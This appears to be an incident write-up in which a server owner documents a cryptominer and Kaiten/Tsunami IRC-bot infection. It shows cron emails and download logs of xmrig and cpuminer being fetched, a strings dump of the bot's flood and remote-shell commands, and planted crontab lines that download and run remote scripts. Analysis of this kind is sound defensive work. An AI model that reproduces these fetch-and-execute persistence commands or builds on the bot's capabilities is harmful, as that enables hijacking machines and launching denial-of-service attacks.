150K .......... .......... .......... .......... ..........  3% 11.3M 4s
200K .......... .......... .......... .......... ..........  4% 1.90M 4s
250K .......... .......... .......... .......... ..........  5% 11.4M 3s
300K .......... .......... .......... .......... ..........  6% 11.3M 3s
350K .......... .......... .......... .......... ..........  7% 11.0M 2s
400K .......... .......... .......... .......... ..........  8% 11.4M 2s
450K .......... .......... .......... .......... ..........  9% 2.93M 2s
500K .......... .......... .......... .......... .......... 10% 11.0M 2s
550K .......... .......... .......... .......... .......... 11% 11.4M 2s
600K .......... .......... .......... .......... .......... 12% 11.3M 2s
650K .......... .......... .......... .......... .......... 13% 11.0M 2s
700K .......... .......... .......... .......... .......... 14% 11.4M 1s
750K .......... .......... .......... .......... .......... 15% 11.3M 1s
800K .......... .......... .......... .......... .......... 16% 11.0M 1s
850K .......... .......... .......... .......... .......... 17% 11.3M 1s
900K .......... .......... .......... .......... .......... 18% 11.0M 1s
950K .......... .......... .......... .......... .......... 19% 11.3M 1s
1000K .......... .......... .......... .......... .......... 20% 11.3M 1s
1050K .......... .......... .......... .......... .......... 21% 11.0M 1s
1100K .......... .......... .......... .......... .......... 22% 11.4M 1s
1150K .......... .......... .......... .......... .......... 23% 1.04M 1s
1200K .......... .......... .......... .......... .......... 24% 15.6M 1s
1250K .......... .......... .......... .......... .......... 25% 24.7M 1s
1300K .......... .......... .......... .......... .......... 26% 36.1M 1s
1350K .......... .......... .......... .......... .......... 27% 28.4M 1s
1400K .......... .......... .......... .......... .......... 28% 30.5M 1s
1450K .......... .......... .......... .......... .......... 29% 24.9M 1s
1500K .......... .......... .......... .......... .......... 29% 26.3M 1s
1550K .......... .......... .......... .......... .......... 30% 20.9M 1s
1600K .......... .......... .......... .......... .......... 31% 24.8M 1s
1650K .......... .......... .......... .......... .......... 32% 23.3M 1s



X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
id 40A16C015E; Sun, 15 Oct 2017 00:00:06 +0200 (CEST)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20171014220006.40A16C015E@timbuktu.lyse.net>
Date: Sun, 15 Oct 2017 00:00:06 +0200 (CEST)

--2017-10-15 00:00:02--  http://176.9.48.167/cpuminer
Connecting to 176.9.48.167:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5296008 (5.0M) [text/plain]
Saving to: ‘/tmp/cpuminer’

0K .......... .......... .......... .......... ..........  0%  527K 10s
50K .......... .......... .......... .......... ..........  1% 1.51M 6s
100K .......... .......... .......... .......... ..........  2% 1.65M 5s
150K .......... .......... .......... .......... ..........  3% 11.4M 4s
200K .......... .......... .......... .......... ..........  4% 1.90M 4s
250K .......... .......... .......... .......... ..........  5% 11.3M 3s
300K .......... .......... .......... .......... ..........  6% 11.4M 3s
350K .......... .......... .......... .......... ..........  7% 11.0M 2s
400K .......... .......... .......... .......... ..........  8% 11.4M 2s
450K .......... .......... .......... .......... ..........  9% 2.79M 2s
500K .......... .......... .......... .......... .......... 10% 11.0M 2s
550K .......... .......... .......... .......... .......... 11% 11.3M 2s
600K .......... .......... .......... .......... .......... 12% 11.3M 2s
650K .......... .......... .......... .......... .......... 13% 11.1M 2s
700K .......... .......... .......... .......... .......... 14% 11.3M 1s
750K .......... .......... .......... .......... .......... 15% 11.4M 1s
800K .......... .......... .......... .......... .......... 16% 10.1M 1s
850K .......... .......... .......... .......... .......... 17% 11.4M 1s
900K .......... .......... .......... .......... .......... 18% 11.0M 1s
950K .......... .......... .......... .......... .......... 19% 11.3M 1s
1000K .......... .......... .......... .......... .......... 20% 11.3M 1s
1050K .......... .......... .......... .......... .......... 21% 11.0M 1s
1100K .......... .......... .......... .......... .......... 22%  566K 1s
1150K .......... .......... .......... .......... .......... 23% 23.8M 1s
1200K .......... .......... .......... .......... .......... 24%  190M 1s
1250K .......... .......... .......... .......... .......... 25%  192M 1s
1300K .......... .......... .......... .......... .......... 26%  173M 1s
1350K .......... .......... .......... .......... .......... 27%  177M 1s
1400K .......... .......... .......... .......... .......... 28%  130M 1s
1450K .......... .......... .......... .......... .......... 29%  199M 1s
1500K .......... .......... .......... .......... .......... 29%  176M 1s
1550K .......... .......... .......... .......... .......... 30%  203M 1s
1600K .......... .......... .......... .......... .......... 31%  200M 1s
1650K .......... .......... .......... .......... .......... 32%  203M 1s
1700K .......... .......... .......... .......... .......... 33%  182M 1s
1750K .......... .......... .......... .......... .......... 34%  201M 1s
1800K .......... .......... .......... .......... .......... 35%  202M 1s
1850K .......... .......... .......... .......... .......... 36%  198M 1s
1900K .......... .......... .......... .......... .......... 37%  175M 1s
1950K .......... .......... .......... .......... .......... 38%  202M 1s
2000K .......... .......... .......... .......... .......... 39%  206M 1s
2050K .......... .......... .......... .......... .......... 40%  194M 1s
2100K .......... .......... .......... .......... .......... 41%  174M 1s
2150K .......... .......... .......... .......... .......... 42%  120M 1s

...
.. .......... .......... .......... .......... 85% 11.4M 0s
4400K .......... .......... .......... .......... .......... 86% 11.0M 0s
4450K .......... .......... .......... .......... .......... 87% 11.3M 0s
4500K .......... .......... .......... .......... .......... 87% 11.4M 0s
4550K .......... .......... .......... .......... .......... 88% 11.0M 0s
4600K .......... .......... .......... .......... .......... 89% 11.3M 0s
4650K .......... .......... .......... .......... .......... 90% 11.4M 0s
4700K .......... .......... .......... .......... .......... 91% 11.0M 0s
4750K .......... .......... .......... .......... .......... 92% 11.3M 0s
4800K .......... .......... .......... .......... .......... 93% 11.0M 0s
4850K .......... .......... .......... .......... .......... 94% 11.4M 0s
4900K .......... .......... .......... .......... .......... 95% 11.3M 0s
4950K .......... .......... .......... .......... .......... 96% 11.0M 0s
5000K .......... .......... .......... .......... .......... 97% 11.4M 0s
5050K .......... .......... .......... .......... .......... 98% 11.3M 0s
5100K .......... .......... .......... .......... .......... 99% 11.0M 0s
5150K .......... .......... .                               100% 11.8M=0.6s

2017-10-15 00:00:05 (8.02 MB/s) - ‘/tmp/cpuminer’ saved [5296008/5296008]


....
...
# some later date with the same update script

4800K .......... .......... .......... .......... .......... 93%  166K 2s
4850K .......... .......... .......... .......... .......... 94%  167K 2s
4900K .......... .......... .......... .......... .......... 95%  140K 1s
4950K .......... .......... .......... .......... .......... 96%  181K 1s
5000K .......... .......... .......... .......... .......... 97%  122K 1s
5050K .......... .......... .......... .......... .......... 98%  148K 0s
5100K .......... .......... .......... .......... .......... 99%  202K 0s
5150K .......... .......... .                               100% 70.8K=31s

2017-11-01 00:00:37 (169 KB/s) - ‘/tmp/cpuminer\r’ saved [5296008/5296008]

: not foundscript: 5: /tmp/updatescript: 
: not foundscript: 36: /tmp/updatescript: 
: not foundscript: 37: /tmp/updatescript: 
ls: cannot access '/tmp/*.so': No such file or directory
/tmp/updatescript: 40: kill: Illegal number: 
: not foundscript: 41: /tmp/updatescript: 
: not foundscript: 42: /tmp/updatescript: exit
: not foundscript: 43: /tmp/updatescript: 

1450K .......... .......... .......... .......... .......... 85%  659K 1s
1500K .......... .......... .......... .......... .......... 88%  643K 0s
1550K .......... .......... .......... .......... .......... 90%  679K 0s
1600K .......... .......... .......... .......... .......... 93%  660K 0s
1650K .......... .......... .......... .......... .......... 96%  927K 0s
1700K .......... .......... .......... .......... .......... 99%  660K 0s
1750K ........                                              100% 11.5M=3.6s

2018-01-04 00:00:09 (493 KB/s) - ‘/tmp/xmrig\r’ saved [1800872/1800872]

: no process found
: not foundscript: 12: /tmp/updatescript: 
: not foundscript: 13: /tmp/updatescript: 
: not foundscript: 44: /tmp/updatescript: 
: not foundscript: 45: /tmp/updatescript: 
ls: cannot access '/tmp/*.so': No such file or directory
/tmp/updatescript: 48: kill: Illegal number: 
: not foundscript: 49: /tmp/updatescript: 
: not foundscript: 50: /tmp/updatescript: exit
: not foundscript: 51: /tmp/updatescript: 
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
id BA0DEC0726; Fri,  5 Jan 2018 00:00:03 +0100 (CET)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20180104230003.BA0DEC0726@timbuktu.lyse.net>
Date: Fri,  5 Jan 2018 00:00:03 +0100 (CET)
Status: O
X-UID: 634

: not foundscript: 6: /tmp/updatescript: 
: not foundscript: 7: /tmp/updatescript: 
: Text file busy
: no process found
: not foundscript: 12: /tmp/updatescript: 
: not foundscript: 13: /tmp/updatescript: 
: not foundscript: 44: /tmp/updatescript: 
: not foundscript: 45: /tmp/updatescript: 
ls: cannot access '/tmp/*.so': No such file or directory
/tmp/updatescript: 48: kill: Illegal number: 
: not foundscript: 49: /tmp/updatescript: 
: not foundscript: 50: /tmp/updatescript: exit
: not foundscript: 51: /tmp/updatescript: 
?  
Return-Path: <carl-erik@timbuktu.lyse.net>




# recent mails show they have improved the script size to less than half:
2018-01-30 00:00:03 (6.31 MB/s) - ‘/tmp/xmrig’ saved [1800872/1800872]
? 
Return-Path: <root@timbuktu.lyse.net>
X-Original-To: root
Delivered-To: root@timbuktu.lyse.net
Received: by timbuktu.lyse.net (Postfix, from userid 0)
        id 529DBC06D0; Wed, 31 Jan 2018 00:00:09 +0100 (CET)
From: root@timbuktu.lyse.net (Cron Daemon)
To: root@timbuktu.lyse.net
Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20180130230009.529DBC06D0@timbuktu.lyse.net>
Date: Wed, 31 Jan 2018 00:00:09 +0100 (CET)
Status: O
X-UID: 657

/tmp/updatescript: 12: kill: No such process

xmrig: no process found
/tmp/updatescript: 22: /tmp/updatescript: sysctl: not found
--2018-01-31 00:00:03--  http://37.59.0.71/xmrig
Connecting to 37.59.0.71:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1800872 (1.7M)
Saving to: ‘/tmp/xmrig’

     0K .......... .......... .......... .......... ..........  2%  143K 12s
    50K .......... .......... .......... .......... ..........  5%  983K 7s
   100K .......... .......... .......... .......... ..........  8%  492K 5s
   150K .......... .......... .......... .......... .......... 11%  494K 5s
   200K .......... .......... .......... .......... .......... 14%  667K 4s
   250K .......... .......... .......... .......... .......... 17%  659K 4s
   300K .......... .......... .......... .......... .......... 19%  654K 3s
   350K .......... .......... .......... .......... .......... 22%  657K 3s
   400K .......... .......... .......... .......... .......... 25%  135K 4s
   450K .......... .......... .......... .......... .......... 28%  116M 3s
   500K .......... .......... .......... .......... .......... 31%  136M 3s
   550K .......... .......... .......... .......... .......... 34%  398K 3s
   600K .......... .......... .......... .......... .......... 36%  400K 3s
   650K .......... .......... .......... .......... .......... 39%  395K 3s
   700K .......... .......... .......... .......... .......... 42%  252K 2s
   750K .......... .......... .......... .......... .......... 45%  396K 2s
   800K .......... .......... .......... .......... .......... 48%  281K 2s
   850K .......... .......... .......... .......... .......... 51%  334K 2s
   900K .......... .......... .......... .......... .......... 54%  403K 2s
   950K .......... .......... .......... .......... .......... 56%  497K 2s
  1000K .......... .......... .......... .......... .......... 59%  654K 2s
  1050K .......... .......... .......... .......... .......... 62%  654K 2s
  1100K .......... .......... .......... .......... .......... 65%  658K 1s
  1150K .......... .......... .......... .......... .......... 68%  666K 1s
  1200K .......... .......... .......... .......... .......... 71%  653K 1s
  1250K .......... .......... .......... .......... .......... 73%  983K 1s
  1300K .......... .......... .......... .......... .......... 76%  688K 1s
  1350K .......... .......... .......... .......... .......... 79%  491K 1s
  1400K .......... .......... .......... .......... .......... 82% 1.02M 1s
  1450K .......... .......... .......... .......... .......... 85%  662K 1s
  1500K .......... .......... .......... .......... .......... 88%  660K 0s
  1550K .......... .......... .......... .......... .......... 90%  668K 0s
  1600K .......... .......... .......... .......... .......... 93%  923K 0s
  1650K .......... .......... .......... .......... .......... 96%  700K 0s
  1700K .......... .......... .......... .......... .......... 99%  906K 0s
  1750K ........                                              100%  443K=3.6s
```
</details>







## "Mystery files" found in /tmp
$ ls -lh /tmp/
totalt 4,3M
-rwxr--r-- 1 root      root      855K jan.  10 00:00 32a1e380
-rw-r--r-- 1 root      root         0 jan.  25 00:00 32a1e380.o
drwxr-xr-x 3 carl-erik carl-erik   60 jan.  17 18:43 npm-3793-f6ec1e45
-rw-r--r-- 1 root      root         0 jan.   6 00:00 out
drwxrwxr-x 2 rslsync   rslsync     40 jan.   5 14:22 resilio_dumps
drwx------ 2 carl-erik carl-erik   60 jan.  15 23:33 ssh-nhGmRFMYqL1w
drwx------ 3 root      root        60 jan.   5 14:22 systemd-private-ff200417979b4963959d62fbfee6de44-redis-server.service-AAf7Aa
drwx------ 3 root      root        60 feb.   6 06:15 systemd-private-ff200417979b4963959d62fbfee6de44-systemd-timesyncd.service-6HhEmJ
-rw------- 1 carl-erik carl-erik  119 feb.   8 13:59 tmp.AEpm1pCDcV
-rw------- 1 carl-erik carl-erik   51 jan.  17 18:43 tmp.E7Zx7xNlTf
-rw------- 1 root      root       119 feb.   8 13:49 tmp.pNImwJr0is
drwx------ 2 carl-erik carl-erik   60 jan.  17 18:50 tmux-1001
-rwxr-xr-x 1 root      root      1,8M jan.   3 18:55 xmrig
-rwxr-xr-x 1 root      root      1,8M jan.   3 18:55 xmrig?
-rw-r--r-- 1 root      root         0 jan.  10 00:00 xmrig.o
-rw-r--r-- 1 root      root         0 jan.   6 00:00 xmrig?.o


### Inspecting the suspicous exe files

A lot of funk! You can see some idiot made these (scroll down). I 
[googled one of the strings, "Kaiten wa goraku"](https://www.google.no/search?client=ubuntu&channel=fs&q=Kaiten+wa+goraku&ie=utf-8&oe=utf-8&gfe_rd=cr&dcr=0&ei=KV98Wu-PH9jEtAG8kqGQBg)
, and it seems that this backdoor/exploit has [roots back to 2013].

I found the [source code](https://dl.packetstormsecurity.net/irc/kaiten.c) through one of the top hits on Google.
Also included it here (`kaiten.c`). I also found a [detailed step by step analysis]
(https://books.google.no/books?id=lRjO8opcPzIC&pg=PA413&lpg=PA413&dq=Kaiten+wa+goraku&source=bl&ots=aXXOlcpv0o&sig=MvPmweYu3lcZ9zH76Szgwl9uRBY&hl=no&sa=X&ved=0ahUKEwiIgMGYxJbZAhUDWCwKHaxgA0kQ6AEIRDAE#v=onepage&q=Kaiten%20wa%20goraku&f=false)
of the this actual malware, although probably an old version. Supposedly I was hit by a TSUNAMI from a "rotating pleasure ring" ...

[Some sibling](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/elf64_kaiten.aa) described 
by Trend Micro.

```
strings /tmp/32a1e380 | less
...
|$Hf
,[^_]
u/Pj
t$Tj
UWVS
,[^_]
UWVS
,[^_]
wwww.omfg.pw
NOTICE %s :Unable to cdgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggmply.
/usr/dict/words
%02x
/proc
Name:
%s : USERID : UNIX : %s
NOTICE %s :GET <host> <save as>
NOTICE %s :Unable to create socket.
http://
NOTICE %s :Unable to resolve address.
NOTICE %s :Unable to connect to http.
GET /%s HTTP/1.0
Connection: Keep-Alive
User-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)
Host: %s:80
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
NOTICE %s :Receiving file.
NOTICE %s :Saved as %s
NOTICE %s :Spoofs: %d.%d.%d.%d
NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d
NOTICE %s :Kaiten wa goraku
NOTICE %s :NICK <nick>
NOTICE %s :Nick cannot be larger than 9 characters.
NICK %s
NOTICE %s :DISABLE <pass>
Disabled
Enabled and awaiting orders
NOTICE %s :Current status is: %s.
NOTICE %s :Already disabled.
NOTICE %s :Password too long! > 254
NOTICE %s :Disable sucessful.
NOTICE %s :ENABLE <pass>
NOTICE %s :Already enabled.
NOTICE %s :Wrong password
NOTICE %s :Password correct.
NOTICE %s :Removed all spoofs
NOTICE %s :What kind of subnet address is that? Do something like: 169.40
NOTICE %s :Unable to resolve %s
NOTICE %s :UDP <target> <port> <secs>
NOTICE %s :Packeting %s.
NOTICE %s :PAN <target> <port> <secs>
NOTICE %s :Panning %s.
NOTICE %s :TSUNAMI <target> <secs>
NOTICE %s :Tsunami heading for %s.
NOTICE %s :UNKNOWN <target> <secs>
NOTICE %s :Unknowning %s.
NOTICE %s :MOVE <server>
NOTICE %s :TSUNAMI <target> <secs>                          = Special packeter that wont be blocked by most firewalls
NOTICE %s :PAN <target> <port> <secs>                       = An advanced syn flooder that will kill most network drivers
NOTICE %s :UDP <target> <port> <secs>                       = A udp flooder
NOTICE %s :UNKNOWN <target> <secs>                          = Another non-spoof udp flooder
NOTICE %s :NICK <nick>                                      = Changes the nick of the client
NOTICE %s :SERVER <server>                                  = Changes servers
NOTICE %s :GETSPOOFS                                        = Gets the current spoofing
NOTICE %s :SPOOFS <subnet>                                  = Changes spoofing to a subnet
NOTICE %s :DISABLE                                          = Disables all packeting from this client
NOTICE %s :ENABLE                                           = Enables all packeting from this client
NOTICE %s :KILL                                             = Kills the client
NOTICE %s :GET <http address> <save as>                     = Downloads a file off the web and saves it onto the hd
NOTICE %s :VERSION                                          = Requests version of client
NOTICE %s :KILLALL                                          = Kills all current packeting
NOTICE %s :HELP                                             = Displays this
NOTICE %s :IRC <command>                                    = Sends this command to the server
NOTICE %s :SH <command>                                     = Executes a command
NOTICE %s :Killing pid %d.
exiting!
TSUNAMI
UNKNOWN
NICK
SERVER
GETSPOOFS
SPOOFS
DISABLE
ENABLE
KILL
VERSION
KILLALL
HELP
j0.0b
IRC 
NOTICE %s :Unable to comply.
export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s
NOTICE %s :%s
MODE %s -xi
JOIN %s :%s
PONG %s
NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.
PRIVMSG
PING
/proc/self/exe
started is %s
we match
Opening %s
another instance running
preparing crontab
crontab -l>out.ct
cat out.ct | grep -v %s >ct.out
cron is %s
echo "*/10 * * * * %s >/dev/null 2>&1" >>ct.out
cron2 is %s
crontab ct.out;rm -f out.ct;rm -f ct.out
memset
argv0 is %s
argc is %i
found at %zu
char is %s
the copied string is %s %d
gotta isntalls %s
we moved
r0ot-
%s%s-%s
bleh
NICK %s
USER %s localhost localhost :%s
ERROR
MD5 part of OpenSSL 1.0.2n  7 Dec 2017
cryptlib.c
dynamic
ERROR


OPENSSL_ia32cap
%lli
%s(%d): OpenSSL internal error, assertion failed: %s
pointer != NULL
<<ERROR>>
ex_data
x509
x509_info
x509_pkey
x509_crl
x509_req
evp_pkey
x509_store
ssl_ctx
ssl_cert
ssl_session
ssl_sess_cert
ssl_method
rand2
debug_malloc
gethostbyname
getservbyname
readdir
RSA_blinding
debug_malloc2
dynlock
engine
ecdsa
ecdh
ec_pre_comp
fips
fips2
mem.c
buf_str.c
stack.c
Stack part of OpenSSL 1.0.2n  7 Dec 2017
err.c
int_thread_get (err.c)
int_err_get (err.c)
unknown
lib(%lu)
func(%lu)
reason(%lu)
error:%08lX:%s:%s:%s
system lib
BN lib
RSA lib
DH lib
EVP lib
BUF lib
OBJ lib
PEM lib
DSA lib
X509 lib
ASN1 lib
CONF lib
CRYPTO lib
EC lib
SSL lib
BIO lib
PKCS7 lib
X509V3 lib
PKCS12 lib
RAND lib
DSO lib
ENGINE lib
OCSP lib
TS lib
nested asn1 error


....
..
B
aes-256-ofb
AES-256-CFB
aes-256-cfb
holdInstructionCode
Hold Instruction Code
holdInstructionNone
Hold Instruction None
holdInstructionCallIssuer
Hold Instruction Call Issuer
holdInstructionReject
Hold Instruction Reject
pilot
pilotAttributeType
pilotAttributeSyntax
pilotObjectClass
pilotGroups
iA5StringSyntax
caseIgnoreIA5StringSyntax
pilotObject
pilotPerson
account
document
room
documentSeries
rFC822localPart
dNSDomain
domainRelatedObject
friendlyCountry
simpleSecurityObject
pilotOrganization
pilotDSA
qualityLabelledData
userId
textEncodedORAddress
mail
rfc822Mailbox
favouriteDrink
roomNumber
photo
userClass
host
manager
documentIdentifier
documentTitle
documentVersion
documentAuthor
documentLocation
homeTelephoneNumber
secretary
otherMailbox
lastModifiedTime
lastModifiedBy
aRecord
pilotAttributeType27
mXRecord
nSRecord
sOARecord
cNAMERecord
associatedDomain
associatedName

documentPublisher
x500UniqueIdentifier
mime-mhs
MIME MHS
mime-mhs-headings
mime-mhs-bodies
id-hex-partial-message
id-hex-multipart-message
generationQualifier
pseudonym
id-set
Secure Electronic Transactions


sig
ICC or token signature
setAttr-SecDevSig
secure device signature
set-brand-IATA-ATA
set-brand-Diners
set-brand-AmericanExpress
set-brand-JCB
set-brand-Visa
set-brand-MasterCard
set-brand-Novus
DES-CDMF
des-cdmf
rsaOAEPEncryptionSET
JOINT-ISO-ITU-T
joint-iso-itu-t
international-organizations
International Organizations
msSmartcardLogin
Microsoft Smartcardlogin
msUPN
Microsoft Universal Principal Name
AES-128-CFB1
aes-128-cfb1
AES-192-CFB1
aes-192-cfb1
AES-256-CFB1
aes-256-cfb1
AES-128-CFB8
aes-128-cfb8
AES-192-CFB8
aes-192-cfb8
AES-256-CFB8
aes-256-cfb8
DES-CFB1


Inherit all
nameConstraints
X509v3 Name Constraints
id-ppl-independent
Independent
RSA-SHA256
sha256WithRSAEncryption
RSA-SHA384
sha384WithRSAEncryption
RSA-SHA512
sha512WithRSAEncryption
RSA-SHA224
sha224WithRSAEncryption
sha384
sha512
sha224
identified-organization
certicom-arc
wap-wsg
id-characteristic-two-basis
onBasis
tpBasis
ppBasis
c2pnb163v1
c2pnb163v2
c2pnb163v3
c2pnb176v1
c2tnb191v1
c2tnb191v2
c2tnb191v3
c2onb191v4
c2onb191v5
c2pnb208w1
c2tnb239v1
c2tnb239v2
c2tnb239v3
c2onb239v4


ecid-wtls12
anyPolicy
X509v3 Any Policy
policyMappings
X509v3 Policy Mappings
inhibitAnyPolicy
X509v3 Inhibit Any Policy
Oakley-EC2N-3
ipsec3
Oakley-EC2N-4
ipsec4
CAMELLIA-128-CBC
camellia-128-cbc
CAMELLIA-192-CBC
camellia-192-cbc
CAMELLIA-256-CBC
camellia-256-cbc
CAMELLIA-128-ECB
camellia-128-ecb
CAMELLIA-192-ECB
camellia-192-ecb
CAMELLIA-256-ECB
camellia-256-ecb
CAMELLIA-128-CFB
camellia-128-cfb
CAMELLIA-192-CFB
camellia-192-cfb
CAMELLIA-256-CFB
camellia-256-cfb
CAMELLIA-128-CFB1
camellia-128-cfb1
CAMELLIA-192-CFB1
camellia-192-cfb1
CAMELLIA-256-CFB1
camellia-256-cfb1
CAMELLIA-128-CFB8
camellia-128-cfb8
CAMELLIA-192-CFB8
camellia-192-cfb8
CAMELLIA-256-CFB8
camellia-256-cfb8
CAMELLIA-128-OFB
camellia-128-ofb
CAMELLIA-192-OFB
camellia-192-ofb
CAMELLIA-256-OFB
camellia-256-ofb
subjectDirectoryAttributes
X509v3 Subject Directory Attributes
issuingDistributionPoint
X509v3 Issuing Distrubution Point
certificateIssuer


ory
id-smime-ct-compressedData
id-ct-asciiTextWithCRLF
id-aes128-wrap
id-aes192-wrap
id-aes256-wrap
ecdsa-with-Recommended
ecdsa-with-Specified
ecdsa-with-SHA224
ecdsa-with-SHA256
ecdsa-with-SHA384
ecdsa-with-SHA512
hmacWithMD5
hmacWithSHA224
hmacWithSHA256
hmacWithSHA384
hmacWithSHA512
dsa_with_SHA224
dsa_with_SHA256
whirlpool
cryptopro
cryptocom
id-GostR3411-94-with-GostR3410-2001
GOST R 34.11-94 with GOST R 34.10-2001
id-GostR3411-94-with-GostR3410-94
GOST R 34.11-94 with GOST R 34.10-94
md_gost94
GOST R 34.11-94
id-HMACGostR3411-94
HMAC GOST 34.11-94
gost2001
gost89
GOST 28147-89
gost89-cnt
gost-mac
GOST 28147-89 MAC
prf-gostr3411-94
GOST R 34.11-94 PRF
id-GostR3410-2001DH
GOST R 34.10-2001 DH
id-GostR3410-94DH
GOST R 34.10-94 DH
id-Gost28147-89-CryptoPro-KeyMeshing
id-Gost28147-89-None-KeyMeshing
id-GostR3411-94-TestParamSet
id-GostR3411-94-CryptoProParamSet
id-Gost28147-89-TestParamSet
id-Gost28147-89-CryptoPro-A-ParamSet
id-Gost28147-89-CryptoPro-B-ParamSet
id-Gost28147-89-CryptoPro-C-ParamSet
id-Gost28147-89-CryptoPro-D-ParamSet

001-CryptoPro-XchA-ParamSet
id-GostR3410-2001-CryptoPro-XchB-ParamSet
id-GostR3410-94-a
id-GostR3410-94-aBis
id-GostR3410-94-b
id-GostR3410-94-bBis
id-Gost28147-89-cc
GOST 28147-89 Cryptocom ParamSet
gost94cc
GOST 34.10-94 Cryptocom
gost2001cc
GOST 34.10-2001 Cryptocom
id-GostR3411-94-with-GostR3410-94-cc
GOST R 34.11-94 with GOST R 34.10-94 Cryptocom
id-GostR3411-94-with-GostR3410-2001-cc
GOST R 34.11-94 with GOST R 34.10-2001 Cryptocom
id-GostR3410-2001-ParamSet-cc
GOST R 3410-2001 Parameter Set Cryptocom
HMAC
hmac
LocalKeySet
Microsoft Local Key set
freshestCRL
X509v3 Freshest CRL
id-on-permanentIdentifier
Permanent Identifier
searchGuide
businessCategory
postalAddress
postOfficeBox
physicalDeliveryOfficeName
telephoneNumber
telexNumber
teletexTerminalIdentifier
facsimileTelephoneNumber
x121Address
internationaliSDNNumber
registeredAddress
destinationIndicator
preferredDeliveryMethod
presentationAddress
supportedApplicationContext
member
owner
roleOccupant
seeAlso
userPassword
userCertificate
cACertificate
authorityRevocationList
certificateRevocationList
crossCertificatePair
enhancedSearchGuide
protocolInformation
distinguishedName
uniqueMember


 Key Usage
MGF1
mgf1
RSASSA-PSS
rsassaPss
AES-128-XTS
aes-128-xts
AES-256-XTS
aes-256-xts
RC4-HMAC-MD5
rc4-hmac-md5
AES-128-CBC-HMAC-SHA1
aes-128-cbc-hmac-sha1
AES-192-CBC-HMAC-SHA1
aes-192-cbc-hmac-sha1
AES-256-CBC-HMAC-SHA1
aes-256-cbc-hmac-sha1
RSAES-OAEP
rsaesOaep
dhpublicnumber
X9.42 DH
brainpoolP160r1
brainpoolP160t1
brainpoolP192r1
brainpoolP192t1
brainpoolP224r1
brainpoolP224t1
brainpoolP256r1
brainpoolP256t1
brainpoolP320r1
brainpoolP320t1
brainpoolP384r1
brainpoolP384t1
brainpoolP512r1
brainpoolP512t1
PSPECIFIED
pSpecified
dhSinglePass-stdDH-sha1kdf-scheme
dhSinglePass-stdDH-sha224kdf-scheme
dhSinglePass-stdDH-sha256kdf-scheme
dhSinglePass-stdDH-sha384kdf-scheme
dhSinglePass-stdDH-sha512kdf-scheme
dhSinglePass-cofactorDH-sha1kdf-scheme
dhSinglePass-cofactorDH-sha224kdf-scheme
dhSinglePass-cofactorDH-sha256kdf-scheme
dhSinglePass-cofactorDH-sha384kdf-scheme
dhSinglePass-cofactorDH-sha512kdf-scheme
dh-std-kdf


999999999999999999999999999999999999999999999999999999999999999999999999999999999999
GCC: (Alpine 6.4.0) 6.4.0
crt/i386/crti.s
/home/buildozer/aports/main/musl/src/musl-1.1.18
GNU AS 2.28
'__d
'__c
'__n
(__b
'__n
(__d
(__s
md5-586.s
/home/buildozer/aports/main/openssl/src/openssl-1.0.2n/crypto/md5
GNU AS 2.28
x86cpuid.s
/home/buildozer/aports/main/openssl/src/openssl-1.0.2n/crypto
GNU AS 2.28
"len
(#ap
$vec
P#env
#off
#ret
#ret
"src
"ptr
9src
"val
```

## The crontab entries made by the script

```
 sudo crontab -l
 @daily wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
 @daily wget -q http://update.sdgsafdsf.pw/upd2 -O /tmp/updatescript2;sh /tmp/updatescript2;rm -rf /tmp/updatescript2 > /dev/null 2>&1 
 @daily wget -q http://update.omfg.pw/upd3 -O /tmp/updatescript3;sh /tmp/updatescript3;rm -rf /tmp/updatescript3 > /dev/null 2>&1 
 */10 * * * * /var/tmp/32a1e380 >/dev/null 2>&1
```
